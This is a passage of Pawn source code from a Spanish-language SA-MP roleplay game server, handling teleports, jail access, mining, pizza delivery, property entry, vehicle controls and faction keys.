	else if(IsPlayerInRangeOfPoint(playerid,2,368.29998779,194.00000000,1008.20001221))
	{
	    SetPlayerPos(playerid,345.70001221,158.00000000,1014.20001221);
	    return 1;
 	}
	else if(IsPlayerInRangeOfPoint(playerid,2,345.70001221,158.00000000,1014.20001221))
	{
	    SetPlayerPos(playerid,368.29998779,194.00000000,1008.20001221);
	    return 1;
	}
	//Deposito (CF del GOBIERNO)
	else if(IsPlayerInRangeOfPoint(playerid,1, 371.9877,167.3057,1008.3828 ))
	{
	    if(!EsDelGobierno(playerid)) return 0;
	    SetPlayerPos(playerid, 372.1235,165.5424,1008.3828 );
		return 1;
	}
	else if(IsPlayerInRangeOfPoint(playerid,1, 372.1235,165.5424,1008.3828 ))
	{
	    if(!EsDelGobierno(playerid)) return 0;
	    SetPlayerPos(playerid, 371.9877,167.3057,1008.3828 );
		return 1;
	}
	else if(IsPlayerInRangeOfPoint(playerid,2,229.3486,126.1162,1003.2188 ))
	{
	    if(!EsLSPD(playerid) && !EsMilitar(playerid))
	    {
			new Float:Pos[3];
			GetPlayerPos(playerid,Pos[0],Pos[1],Pos[2]);
	        foreach(Player,i)
	        {
	            if(EsLSPD(i) || EsMilitar(i) && GetPlayerInterior(i) == 10)
	            {
	                if(IsPlayerInRangeOfPoint(i,3,Pos[0],Pos[1],Pos[2]))
					{
	    				SetPlayerPos(playerid, 2526.8716,-1314.6315,1031.4219 );
	    				SetPlayerInterior(playerid,2);
	    				CongelarEx(playerid,3);
	    				return 1;
					}
				}
			}
			return Error(playerid,"¡No puedes ir a las carceles si no tienes un policia al lado!");
		}
		else
		{
 			SetPlayerPos(playerid, 2526.8716,-1314.6315,1031.4219 );
			SetPlayerInterior(playerid,2);
			CongelarEx(playerid,3);
		}
	}
	else if(IsPlayerInRangeOfPoint(playerid,2,2526.8716,-1314.6315,1031.4219 ))
	{
	    if(!EsLSPD(playerid) && !EsMilitar(playerid))
	    {
			new Float:Pos[3];
			GetPlayerPos(playerid,Pos[0],Pos[1],Pos[2]);
	        foreach(Player,i)
	        {
	            if(EsLSPD(i) || EsMilitar(i) && GetPlayerInterior(i) == 2)
	            {
	                if(IsPlayerInRangeOfPoint(i,3,Pos[0],Pos[1],Pos[2]))
					{
	    				SetPlayerPos(playerid, 229.3486,126.1162,1003.2188 );
	    				SetPlayerInterior(playerid,10);
	    				return 1;
					}
				}
			}
			return Error(playerid,"¡No puedes salir de las carceles si no tienes un policia al lado!");
		}
		else
		{
 			SetPlayerPos(playerid, 229.3486,126.1162,1003.2188 );
			SetPlayerInterior(playerid,10);
		}
		return 1;
	}
	else if(IsPlayerInRangeOfPoint(playerid,2,2558.7690,-1280.7249,1031.4219 )) return SetPlayerPos(playerid,2561.0989,-1280.4092,1037.726);
	else if(IsPlayerInRangeOfPoint(playerid,2,2558.4033,-1306.8978,1031.4219 )) return SetPlayerPos(playerid,2560.6416,-1306.9424,1037.6920);
	else if(IsPlayerInRangeOfPoint(playerid,2,2561.0989,-1280.4092,1037.726 )) return SetPlayerPos(playerid,2558.7690,-1280.7249,1031.4219);
	else if(IsPlayerInRangeOfPoint(playerid,2,2560.6416,-1306.9424,1037.6920 )) return SetPlayerPos(playerid,2558.4033,-1306.8978,1031.4219);
	else if(IsPlayerInRangeOfPoint(playerid,2,350.2999878,178.0000000,1014.2000122)) return SetPlayerPos(playerid, 333.7999878,165.8000031,1014.2000122); // Ascensor HITMAN
	else if(IsPlayerInRangeOfPoint(playerid,2,333.7999878,165.8000031,1014.2000122)) return SetPlayerPos(playerid, 350.2999878,178.0000000,1014.2000122); // Ascensor HITMAN

	return 0;
}

CALLBACK: Float: Angle2D(Float:PointA[], Float:PointB[])
{
/*	new
	    Float: Angle;

	Angle = floatabs(atan2(PointA[0]-PointB[0], PointA[1]-PointB[1]));
*/
	new bool:A_LS_B[2], Float:Dist[2], Float:Angle;

	for (new i = 0; i < 2; i++)
	{
		A_LS_B[i] = PointA[i] < PointB[i];
		Dist[i] = A_LS_B[i] ? PointB[i] - PointA[i] : PointA[i] - PointB[i];
	}

	Angle = atan2(Dist[1],Dist[0]);
	Angle = A_LS_B[0] ? 270.0 + Angle : 90.0 - Angle;
	Angle = A_LS_B[1] ? Angle : 180.0 - Angle;

	return Angle;
}

stock IsVehicleInRangeOfPoint(vehicleid, Float:radi, Float:x, Float:y, Float:z)
{
	return (GetVehicleDistanceFromPoint(vehicleid, x, y, z) < radi);
}

public OnPlayerKeyStateChange(playerid,newkeys,oldkeys)
{
	if(GetPVarInt(playerid, "ParteConceptos"))
	{
	    static
			Time_OLD[MAX_PLAYERS];

	    if((GetTickCount() - Time_OLD[playerid]) < 3000)
	    {
	        return TextoJugador(playerid, "~g~~h~~h~espera tres segundos minimo", 3000, 3);
		}

	 	Time_OLD[playerid] = GetTickCount( );
	 	ConceptosDeRol(playerid);
		return 1;
	}

	if(UsandoHackPad[playerid])
	{
		if((newkeys & KEY_SECONDARY_ATTACK) && !(oldkeys & KEY_SECONDARY_ATTACK))
		{
			new
				key_player[MAX_KEY_NUMBERS+1],
				key_player_2[2],
				i = 0;

			for(i = 0; i < MAX_KEY_NUMBERS; i++)
			{
				format(key_player_2, 2, "%d", NumberKey[playerid][i]);

				strcat(key_player, key_player_2);
			}
			PlayerPlaySound(playerid, 1139, 0, 0, 0);
			OnPlayerConfirmKeyPad(playerid, key_player);
		}
		return 1;
	}

	new
	    PVAR_MINERO = GetPVarInt(playerid, "MINERO_CLICKS");

	if(PVAR_MINERO)
	{
	    if(newkeys & KEY_FIRE)
	    {
			PVAR_MINERO--;
			SetPVarInt(playerid, "MINERO_CLICKS", PVAR_MINERO);
			new str[40];
			A_Format(str, "~w~Golpes restantes: ~b~%d", PVAR_MINERO);
			GameTextForPlayer(playerid, str, 15000, 3);
			if(!PVAR_MINERO)
			{
				CongelarEx(playerid, 1);
				GameTextForPlayer(playerid, " ", 1, 3);
				cmd_detener(playerid, "");

				new
				    index = GetPVarInt(playerid, "MINERO_MIN_ID"),
					gramos = Rand(500, 2000),
					Str[100];

				DestroyDynamicObject( InfoMineral[index][minObjID] );

				Bit_Set(ValidMineral, index, false);

				switch(InfoMineral[index][minType])
				{
					case MIN_ORO:
					{
						InfoJugador[playerid][jMineral][M_TYPE_ORO] += gramos;
						A_Format(Str, "Picaste %d gramos de {F4C600}Oro, "#CBLANCO"formando un total de %d gramos.", gramos, InfoJugador[playerid][jMineral][M_TYPE_ORO]);
					}
					case MIN_PLATA:
					{
						InfoJugador[playerid][jMineral][M_TYPE_PLATA] += gramos;
						A_Format(Str, "Picaste %d gramos de {E7E3E8}Plata, "#CBLANCO"formando un total de %d gramos.", gramos, InfoJugador[playerid][jMineral][M_TYPE_PLATA]);
					}
					case MIN_HIERRO:
					{
						InfoJugador[playerid][jMineral][M_TYPE_HIERRO] += gramos;
						A_Format(Str, "Picaste %d gramos de {FF8300}Hierro, "#CBLANCO"formando un total de %d gramos.", gramos, InfoJugador[playerid][jMineral][M_TYPE_HIERRO]);
					}
					case MIN_RUBI:
					{
						InfoJugador[playerid][jMineral][M_TYPE_RUBI] += gramos;
						A_Format(Str, "Picaste %d gramos de {FF0000}Rubi, "#CBLANCO"formando un total de %d gramos.", gramos, InfoJugador[playerid][jMineral][M_TYPE_RUBI]);
					}
					case MIN_ESMERALDA:
					{
						InfoJugador[playerid][jMineral][M_TYPE_ESMERALDA] += gramos;
						A_Format(Str, "Picaste %d gramos de {00FF00}Esmeralda, "#CBLANCO"formando un total de %d gramos.", gramos, InfoJugador[playerid][jMineral][M_TYPE_ESMERALDA]);
					}
					case MIN_ZAFIRO:
					{
						InfoJugador[playerid][jMineral][M_TYPE_ZAFIRO] += gramos;
						A_Format(Str, "Picaste %d gramos de {0000FF}Zafiro, "#CBLANCO"formando un total de %d gramos.", gramos, InfoJugador[playerid][jMineral][M_TYPE_ZAFIRO]);
					}
					case MIN_DIAMANTE:
					{
						gramos -= 450;
						InfoJugador[playerid][jMineral][M_TYPE_DIAMANTE] += gramos;
						A_Format(Str, "Picaste %d gramos de {00FFFF}Diamante, "#CBLANCO"formando un total de %d gramos.", gramos, InfoJugador[playerid][jMineral][M_TYPE_DIAMANTE]);
					}
					case MIN_CARBON:
					{
						InfoJugador[playerid][jMineral][M_TYPE_CARBON] += gramos;
						A_Format(Str, "Picaste %d gramos de {69696E}Carbón, "#CBLANCO"formando un total de %d gramos.", gramos, InfoJugador[playerid][jMineral][M_TYPE_CARBON]);
					}
				}
				Mensaje(playerid, -1, Str);
			}
		}
		return 1;
	}

	if(GetPVarInt(playerid, "Parte_RepartirP") == 1)
	{
	    if(newkeys & KEY_SECONDARY_ATTACK)
	    {
			new
			    VehID = GetPlayerVehicleID(playerid);

			if(VehID == 0) //
			{
			    if(GetPVarInt(playerid, "Veh_RepartirP")) return 1;

			    new
			        VehID2 = VehMasCercano(playerid, false, 6.0);

				if(Veh[VehID2][vTrabajo] != ID_RepartidorP || VehID2 == INVALID_VEHICLE_ID) return 1;

				foreach(Player, i)
				{
				    if(InfoJugador[i][jTrabajo] == ID_RepartidorP)
				    {
						if(GetPVarInt(i, "Veh_RepartirP") == VehID2) return Error(playerid, "¡Ya hay una pizza en esta moto!");
					}
				}

				SetPVarInt(playerid, "Veh_RepartirP", VehID2);

				RemovePlayerAttachedObject(playerid, SLOT_OBJECTS);
				SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);

				AutoRol(playerid, "mete la pizza en la caja de la moto");
				Mensaje(playerid, -1, "Debes utilizar esa moto para luego retirar la pizza.");

			}
			else
			{
			    if(VehID == GetPVarInt(playerid, "Veh_RepartirP"))
			    {
			        RemovePlayerFromVehicle(playerid);
       				SetPlayerAttachedObject(playerid, SLOT_OBJECTS, 1582, 5, 0.1889, 0.1099, 0.0880, 98.1999, 7.4999, -107.0999, 1.0000, 1.0000, 1.0000);
					SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);

					DeletePVar(playerid, "Veh_RepartirP");
				}
			}
		}
	}

	if(InfoJugador[playerid][jCansancio] < 5 && !IsPlayerInAnyVehicle(playerid))
	{
  		if(newkeys & KEY_SPRINT)
		{
		    ApplyAnimation(playerid, "PED","IDLE_tired",3.0,1,0,0,0,0);
		}
	}

	if(newkeys & KEY_NO && !IsPlayerInAnyVehicle(playerid))
	{
		ShowInv(playerid);
		return 1;
	}

	if(!IsPlayerInAnyVehicle(playerid))
	{
		switch(newkeys)
		{
		    case KEY_YES:
		    {
				static
					old_pressed[MAX_PLAYERS];

				if(GetTickCount() - old_pressed[playerid] < 1000)
					return 0;

				old_pressed[playerid] = GetTickCount();

				new
				    kp = GetNearKP(playerid);

				if(kp != -1)
				{
					new
					    i = kp,
						Float: PlayerPos[3],
						Float: KeyPadPos[3];

					KeyPadPos[0] = KeyPadInfo[i][kpPosx];
					KeyPadPos[1] = KeyPadInfo[i][kpPosy];
					KeyPadPos[2] = KeyPadInfo[i][kpPosz];

					GetPlayerPos(playerid, PlayerPos[0], PlayerPos[1], PlayerPos[2]);

					new
						Float: Angle = Angle2D(PlayerPos, KeyPadPos);

					SetPlayerFacingAngle(playerid, Angle);

					SetPlayerPos(playerid, KeyPadInfo[i][kpPosx] - (0.65 * floatsin(-Angle,degrees)),
					KeyPadInfo[i][kpPosy] - (0.65 * floatcos(-Angle,degrees)),
					KeyPadInfo[i][kpPosz] - 0.63);

					ApplyAnimation(playerid, "HEIST9", "Use_SwipeCard", 10.0, 0, 0, 0, 0, 0);
					SetTimerEx("OnPlayerPressKeyPad", 600, false, "ii", playerid, i);
					return 1;
				}
				if(Portones(playerid)) return 1;
		        if(PortonesAutomaticos(playerid)) return 1;
		        if(Interiores(playerid)) return 1;
		        if(GetPlayerInterior(playerid) == 0)
		        {
        			foreach(Casas,c)
			   	 	{
			      		if(IsPlayerInRangeOfPoint(playerid,2,InfoCasa[c][cEntrada_x],InfoCasa[c][cEntrada_y],InfoCasa[c][cEntrada_z]))
			        	{
					    	if(InfoCasa[c][cCerrada])
						    {
								TextoJugador(playerid,"~w~Esta casa esta ~r~cerrada",3000,3);
								Mensaje(playerid, -1, "Use "#CINFO"/puerta "#CBLANCO"para escribir la contraseña.");
								return 1;
							}
			    			if(InfoCasa[c][cComprada])
				    		{
					            SetPlayerPos(playerid,InfoCasa[c][cSalida_x],InfoCasa[c][cSalida_y],InfoCasa[c][cSalida_z]);
					            SetPlayerVirtualWorld(playerid,InfoCasa[c][cVW]);
					            SetPlayerInterior(playerid,InfoCasa[c][cInt]);
								GameTextForPlayer(playerid,_TD(InfoCasa[c][cNombre]),4000,1);
				            	return 1;
							}
							else
							{
								Dialog(playerid,dError,DIALOG_STYLE_MSGBOX,""#CAZUL2"- Visita -",""#CBLANCO"Esta casa, está a la venta.\n\tNo obstante, puedes hacer una visíta para ver el interior "#CINFO"(20 segs.)\n\n"#CBLANCO"Si no encuentras muebles, no te asustes. Recuerda que \ndeberás comprar los muebles por separado.","Cerrar","");
	             				Timer_Jugador[playerid][TIMER_VISITAC] = SetTimerEx("T_VisitaCasa",20000,false,"ii",playerid,c);
								SetPVarInt(playerid,"CASA_VISITA",c);
		            			SetPlayerPos(playerid,InfoCasa[c][cSalida_x],InfoCasa[c][cSalida_y],InfoCasa[c][cSalida_z]);
					            SetPlayerVirtualWorld(playerid,InfoCasa[c][cVW]);
					            SetPlayerInterior(playerid,InfoCasa[c][cInt]);
								GameTextForPlayer(playerid,_TD(InfoCasa[c][cNombre]),4000,1);
				            	return 1;
							}
						}
					}
     				foreach(Negocios,n)
					{
	  		      		if(IsPlayerInRangeOfPoint(playerid,3,InfoNegocio[n][nEntrada_x],InfoNegocio[n][nEntrada_y],InfoNegocio[n][nEntrada_z]))
			        	{
					    	if(InfoNegocio[n][nCerrado])
						    {
								TextoJugador(playerid,"~w~Este negocio esta ~r~cerrado",3000,3);
								return 1;
							}
							if(InfoNegocio[n][nTipo] == N_TECNOLOGIA || InfoNegocio[n][nTipo] == N_FARMACIA)
							{
								GameTextForPlayer(playerid,"~w~cargando~n~~b~~h~~h~~h~espera un momento..",3000,3);
								CongelarEx(playerid,3);
							}
			    			if(InfoNegocio[n][nComprado] == true)
				    		{
					            SetPlayerVirtualWorld(playerid,InfoNegocio[n][nVW]);
					            SetPlayerInterior(playerid,InfoNegocio[n][nInt]);
								GameTextForPlayer(playerid,_TD(InfoNegocio[n][nNombre]),4000,1);
								SetPlayerPos(playerid,InfoNegocio[n][nSalida_x],InfoNegocio[n][nSalida_y],InfoNegocio[n][nSalida_z]);
								if(InfoNegocio[n][nPrecioEntrada])
								{
								    if(GetPlayerMoney(playerid) < InfoNegocio[n][nPrecioEntrada]) return Error(playerid,"Dinero insuficiente, no puedes entrar.");
				    				QuitarDinero(playerid,InfoNegocio[n][nPrecioEntrada]);
									InfoNegocio[n][nDinero] += InfoNegocio[n][nPrecioEntrada];
								}
								return 1;
							}
							else
							{
					            SetPlayerVirtualWorld(playerid,InfoNegocio[n][nVW]);
					            SetPlayerInterior(playerid,InfoNegocio[n][nInt]);
								GameTextForPlayer(playerid,_TD(InfoNegocio[n][nNombre]),4000,1);
								SetPlayerPos(playerid,InfoNegocio[n][nSalida_x],InfoNegocio[n][nSalida_y],InfoNegocio[n][nSalida_z]);
								return 1;
							}
						}
					}
				}
    			foreach(Garages,i)
				{
					if(IsPlayerInRangeOfPoint(playerid,2,InfoGarage[i][gExt_x],InfoGarage[i][gExt_y],InfoGarage[i][gExt_z]))
					{
						if(InfoGarage[i][gCerrado] == true)
						{
						    TextoJugador(playerid,"~w~este garage esta ~r~cerrado",3000,3);
						    return 1;
						}
					    SetPlayerPos(playerid,InfoGarage[i][gInt_x],InfoGarage[i][gInt_y],InfoGarage[i][gInt_z]);
						SetPlayerInterior(playerid,InfoGarage[i][gInt]);
						SetPlayerVirtualWorld(playerid,InfoGarage[i][gVW]);
						return 1;
					}
					else if(IsPlayerInRangeOfPoint(playerid,2,InfoGarage[i][gInt_x],InfoGarage[i][gInt_y],InfoGarage[i][gInt_z]) && (GetPlayerVirtualWorld(playerid) == InfoGarage[i][gVW]))
					{
	    				SetPlayerPos(playerid,InfoGarage[i][gExt_x],InfoGarage[i][gExt_y],InfoGarage[i][gExt_z]);
						SetPlayerInterior(playerid,0);
						SetPlayerVirtualWorld(playerid,0);
						return 1;
					}
				}
				Loop(i, sizeof InfoInterior, 0)
				{
					if(IsPlayerInRangeOfPoint(playerid,2,InfoInterior[i][intEntrada_x],InfoInterior[i][intEntrada_y],InfoInterior[i][intEntrada_z]))
					{
					    if(CallLocalFunction("OnPlayerRequestEnterInterior", "ii", playerid, i))
					    {
							SetPlayerPos(playerid,InfoInterior[i][intSalida_x],InfoInterior[i][intSalida_y],InfoInterior[i][intSalida_z]);
							SetPlayerInterior(playerid, InfoInterior[i][intInt]);
							SetPlayerFacingAngle(playerid, InfoInterior[i][intSalida_a]);
							SetPVarInt(playerid, "ID_Interior", i);
							if(InfoInterior[i][intTiempo])
							{
							    //  -> TexDraws
							    new
							        pVar = GetPVarInt(playerid, "INT_TD_ID_0");

							    if(pVar)
							    {
							        PlayerTextDrawDestroy(playerid, PlayerText:pVar);
							        PlayerTextDrawDestroy(playerid, PlayerText:GetPVarInt(playerid, "INT_TD_ID_1"));
								}

							    new
							        PlayerText: ID_TD;

							   	ID_TD = CreatePlayerTextDraw(playerid, 0.000000, 0.000000, "_");
								PlayerTextDrawLetterSize(playerid, ID_TD, 0.500000, 54.000000);
								PlayerTextDrawUseBox(playerid, ID_TD, true);
								PlayerTextDrawBoxColor(playerid, ID_TD, 255);
								PlayerTextDrawTextSize(playerid, ID_TD, 650.000000, 0.000000);
								PlayerTextDrawShow(playerid, ID_TD);

								SetPVarInt(playerid, "INT_TD_ID_0", _:ID_TD);

								ID_TD = CreatePlayerTextDraw(playerid, 460.000000, 380.800048, "Cargando...");
								PlayerTextDrawLetterSize(playerid, ID_TD, 0.505999, 2.608000);
								PlayerTextDrawAlignment(playerid, ID_TD, 1);
								PlayerTextDrawColor(playerid, ID_TD, -1378294017);
								PlayerTextDrawSetShadow(playerid, ID_TD, 0);
								PlayerTextDrawSetOutline(playerid, ID_TD, -2);
								PlayerTextDrawBackgroundColor(playerid, ID_TD, 51);
								PlayerTextDrawFont(playerid, ID_TD, 2);
								PlayerTextDrawSetProportional(playerid, ID_TD, 1);
								PlayerTextDrawShow(playerid, ID_TD);

								SetPVarInt(playerid, "INT_TD_ID_1", _:ID_TD);

								//   -> Objetos
								CongelarEx(playerid, InfoInterior[i][intTiempo]);

								TogglePlayerControllable(playerid, false);

								SetTimerEx("CargoObjetos", InfoInterior[i][intTiempo]*1000, false, "i", playerid);

							}
						}
						return 1;
					}
				    else if(IsPlayerInRangeOfPoint(playerid, 2, InfoInterior[i][intSalida_x], InfoInterior[i][intSalida_y], InfoInterior[i][intSalida_z]))
				    {
						SetPlayerInterior(playerid, 0);
						DeletePVar(playerid, "ID_Interior");
						SetPlayerPos(playerid, InfoInterior[i][intEntrada_x], InfoInterior[i][intEntrada_y], InfoInterior[i][intEntrada_z]);
						SetPlayerFacingAngle(playerid, InfoInterior[i][intSalida_a]);
						return 1;
					}
				}

				if(EstaEnCasa(playerid))
				{
				    new i = ID_Casa(playerid);
				    if(IsPlayerInRangeOfPoint(playerid,2,InfoCasa[i][cSalida_x],InfoCasa[i][cSalida_y],InfoCasa[i][cSalida_z]))
				    {
				        if(GetPVarInt(playerid,"CASA_VISITA") == i)
						{
						    KillTimer2(playerid,TIMER_VISITAC);
						    DeletePVar(playerid,"CASA_VISITA");
						}
				        SetPlayerPos(playerid,InfoCasa[i][cEntrada_x],InfoCasa[i][cEntrada_y],InfoCasa[i][cEntrada_z]);
						SetPlayerInterior(playerid,0);
						SetPlayerVirtualWorld(playerid,0);
						return 1;
					}
					return 1;
				}
				else if(EstaEnNegocio(playerid))
				{
				    new i = ID_Negocio(playerid);
				    if(IsPlayerInRangeOfPoint(playerid,2,InfoNegocio[i][nSalida_x],InfoNegocio[i][nSalida_y],InfoNegocio[i][nSalida_z]))
				    {
				        if(GetPVarInt(playerid,"ROBANDO"))
						{
					 		Error(playerid,"¡No puedes salir del negocio, estás robando!");
				            Mensaje(playerid,-1,"Debes estar un minuto en el negocio");
				            return 1;
						}
						if(GetPVarInt(playerid,"BUSCADO"))
						{
						    foreach(Player,p) if(EsLSPD(p))
						    {
						        SetPlayerMarkerForPlayer(p,playerid, 0xB06B90FF);
						        Mensaje(p, -1,"El {B06B90}SOSPECHOSO "#CBLANCO"salió de un negocio.");
							}
						}
				        SetPlayerPos(playerid,InfoNegocio[i][nEntrada_x],InfoNegocio[i][nEntrada_y],InfoNegocio[i][nEntrada_z]);
						SetPlayerInterior(playerid,0);
						SetPlayerVirtualWorld(playerid,0);
						return 1;
					}
					return 1;
				}
				return 1;
			}
		}
	}
	else if(IsPlayerInAnyVehicle(playerid))
	{
		new VehID = GetPlayerVehicleID(playerid);
	    switch(newkeys)
	    {
			case KEY_YES:
			{
				static
				    Time_OldPress[MAX_PLAYERS];

				if((GetTickCount() - Time_OldPress[playerid]) < 2000)
				{
				    return 1;
				}

				Time_OldPress[playerid] = GetTickCount();

				if(PortonesAutomaticos(playerid)) return 1;

				foreach(Garages,i)
				{
					if(IsPlayerInRangeOfPoint(playerid,3,InfoGarage[i][gExtV_x],InfoGarage[i][gExtV_y],InfoGarage[i][gExt_z]))
					{
						if(InfoGarage[i][gCerrado] == true)
						{
						    TextoJugador(playerid,"~w~este garage esta ~r~cerrado",3000,3);
						    return 1;
						}
						if(!InfoCasa[InfoGarage[i][gIDCasa]][cComprada])
						{
						    TextoJugador(playerid,_TD("~w~no puedes entrar con ~r~vehículos.~w~~n~^Solo el dueño puede!"),4000,3);
						    return 1;
						}
						LinkVehicleToInterior(GetPlayerVehicleID(playerid),InfoGarage[i][gInt]);
						SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),InfoGarage[i][gVW]);
						SetVehicleZAngle(GetPlayerVehicleID(playerid),0);
					    SetVehiclePos(GetPlayerVehicleID(playerid),InfoGarage[i][gIntV_x],InfoGarage[i][gIntV_y],InfoGarage[i][gInt_z]);
						SetPlayerInterior(playerid,InfoGarage[i][gInt]);
						SetPlayerVirtualWorld(playerid,InfoGarage[i][gVW]);
						foreach(Player,p)
						{
						    if(IsPlayerInVehicle(p,GetPlayerVehicleID(playerid)))
						    {
								SetPlayerInterior(p,InfoGarage[i][gInt]);
								SetPlayerVirtualWorld(p,InfoGarage[i][gVW]);
							}
						}
						return 1;
					}
					else if(IsPlayerInRangeOfPoint(playerid,3,InfoGarage[i][gIntV_x],InfoGarage[i][gIntV_y],InfoGarage[i][gInt_z]) && GetPlayerVirtualWorld(playerid) == InfoGarage[i][gVW])
					{
						LinkVehicleToInterior(GetPlayerVehicleID(playerid),0);
						SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),0);
			    		SetVehiclePos(GetPlayerVehicleID(playerid),InfoGarage[i][gExtV_x],InfoGarage[i][gExtV_y],InfoGarage[i][gExt_z]);
						SetPlayerInterior(playerid,0);
						SetPlayerVirtualWorld(playerid,0);
						SetVehicleZAngle(GetPlayerVehicleID(playerid),InfoGarage[i][gAng]);
						foreach(Player,p)
						{
						    if(IsPlayerInVehicle(p,GetPlayerVehicleID(playerid)))
						    {
								SetPlayerInterior(p,0);
								SetPlayerVirtualWorld(p,0);
							}
						}
						return 1;
					}
				}
			}
	        case KEY_FIRE:
	        {
		    	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		    	{
		    	    if(GetVehType(VehID) == VEHICLE_TYPE_BICYCLE) return 1;
					//              AUTOS VENTA         //
					if(VehVenta_ID(VehID) != 0)
					{
						if(!TieneLlaveVeh(playerid,VehID))
						{
							return Error(playerid,"¡No tienes la llave de este vehículo!");
						}
	  					if(!Veh[VehID][vMotor])
			  			{
			 				if(GetProgressBarValue(BMotor[playerid]) > 1) return Error(playerid,"¡Espera que termine de cargar!");

							new
							    Float: HP;
							    
							GetVehicleHealth(VehID, HP);
							
							if(HP <= 420.0)
							{
							    Mensaje(playerid, -1, "El motor está "#CROJO"quemado "#CBLANCO", ¡llama un mecánico!");
							    return 1;
							}
			 				ShowProgressBarForPlayer(playerid, BMotor[playerid]);
							KillTimer2(playerid,TIMER_BMOTOR);
			 				Timer_Jugador[playerid][TIMER_BMOTOR] = SetTimerEx("SubeBarraMotor",30,true,"i",playerid);
						}
						else
						{
							AutoRol(playerid,"apaga el motor del vehículo");
							ApagarMotor(VehID);
						}
					}
					else
					{
						if(!TieneLlaveVeh(playerid,VehID))
						{
							return Error(playerid,"¡No tienes la llave de este vehículo!");
						}
	  					if(!Veh[VehID][vMotor])
			  			{
			 				if(GetProgressBarValue(BMotor[playerid]) > 1) return Error(playerid,"¡Espera que termine de cargar!");
			 				ShowProgressBarForPlayer(playerid, BMotor[playerid]);
							KillTimer2(playerid,TIMER_BMOTOR);
			 				Timer_Jugador[playerid][TIMER_BMOTOR] = SetTimerEx("SubeBarraMotor",30,true,"i",playerid);
						}
						else
						{
							AutoRol(playerid,"apaga el motor del vehículo");
							ApagarMotor(VehID);
						}
					}

				}
				return 1;
			}
			case KEY_ACTION:
			{
				if(!TieneLlaveVeh(playerid,VehID)) return Error(playerid,"¡No tienes acceso a este vehículo!");
  				ShowPlayerDialog(playerid,dControlVeh,DIALOG_STYLE_LIST,""#CPOSITIVO"Tablero (vehículo)","- Trabar o destrabar puertas\n- Trabar o destrabar capó\n- Trabar o destrabar maletero","Aceptar","Salir");
				return 1;
			}
			case KEY_NO:
			{
		 		if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		       	{
		       	    if(!Veh[GetPlayerVehicleID(playerid)][vLuces])
		       	    {
						EncenderLuces(GetPlayerVehicleID(playerid));
					}
					else
					{
						ApagarLuces(GetPlayerVehicleID(playerid));
					}
				}
				return 1;
			}
		}
	}
	return 1;
}

stock DarLlavesFaccion(playerid)
{
	foreach(Vehicle, i)
	{
	    if(Veh[i][vFaccion] == InfoJugador[playerid][jLider])
	    {
			Bit_Set(Llave_veh[playerid], i, true);
		}
	}
	Mensaje(playerid, -1, "• Se te entregaron todas las llaves de los vehículos de tu facción.");
	GuardarLlaves(playerid);
	return 1;
}

stock SacarLlavesFaccion(playerid)
{
	foreach(Vehicle, i)
	{
	    if(Veh[i][vFaccion] == ID_Faccion(playerid))
	    {
			Bit_Set(Llave_veh[playerid], i, false);
		}
	}
	Mensaje(playerid, -1, "• Se te retiraron todas las llaves de los vehículos de tu facción.");
	GuardarLlaves(playerid);
	return 1;
}

CALLBACK: OnPlayerRequestEnterInterior(playerid, interiorid)
{
	return 1;
}

public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
	if(ispassenger == 0)
	{
		new
 			Float:Pos[3];

		GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);

	    if(Veh[vehicleid][vTrabajo])
	    {
	        if(Veh[vehicleid][vTrabajo] != InfoJugador[playerid][jTrabajo])
	        {
				SetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
				Error(playerid, "¡Este vehículo no pertenece a tu trabajo!");
				return 1;
			}
			switch(Veh[vehicleid][vTrabajo])
			{
				case ID_Basurero:
				{
				    if(GetPVarInt(playerid,"CAMION_BASURA") != vehicleid)
					{
						foreach(Player,i)
						{
							if(GetPVarInt(i,"CAMION_BASURA") == vehicleid)
							{
								Error(playerid,"¡Ya alguien está utilizando este camión!");
								SetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
								return 1;
							}
						}
					}
				}
				case ID_Cosechador:
				{
					if(GetPVarInt(playerid,"EstaCultivando") > 0)
					{
						if(GetPVarInt(playerid,"EstaCultivando") == vehicleid)
						{
							Mensaje(playerid,-1,"Continua la cosecha.");
							ShowProgressBarForPlayer(playerid,BCosecha[playerid]);
							return 1;
						}
						else
						{
							Error(playerid,"¡Esta cosechadora no es la tuya!");
							SetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
							return 1;
						}
					}
					Mensaje(playerid,-1,"Usa /cosechar para comenzar a trabajar");
				}
			}
		}
		else if(Veh[vehicleid][vFaccion])
		{
	        if(Veh[vehicleid][vFaccion] != ID_Faccion(playerid))
	        {
				SetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
				Error(playerid, "¡Este vehículo no pertenece a tu facción!");
				return 1;
			}
		}

	    new
			VictimID = INVALID_PLAYER_ID;

	    foreach(Player, i) if(IsPlayerInVehicle(i, vehicleid) && GetPlayerState(i) == PLAYER_STATE_DRIVER)
	    {
	        VictimID = i;
	        break;
		}
		if(VictimID != INVALID_PLAYER_ID)
		{
			new
			    Rol_Str[80];

			static
			    Old_CarJack[MAX_PLAYERS];

			if((GetTickCount() - Old_CarJack[playerid]) < 5000)
			{
				SetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
				return 1;
			}

			Old_CarJack[playerid] = GetTickCount();

			switch(random(3))
			{
			    case 0:
			    {
					A_Format(Rol_Str, "intenta sacar del vehículo a la fuerza a %s, y lo logra", NombreJugador(VictimID));
					AutoRol(playerid, Rol_Str);
				}
				default:
				{
					A_Format(Rol_Str, "intenta sacar del vehículo a la fuerza a %s, pero falla", NombreJugador(VictimID));
					AutoRol(playerid, Rol_Str);
					SetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
					CongelarEx(playerid, 5);
				}
			}
		}
	}
	return 1;
}

public OnPlayerExitVehicle(playerid, vehicleid)
{
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
 		if(Veh[vehicleid][vCerrado])
 		{
 	    	AbrirPuertas(vehicleid);
		}
	}

	if(GetPVarInt(playerid,"FORZADO_COCHE")) return PutPlayerInVehicle(playerid,vehicleid,1),1;
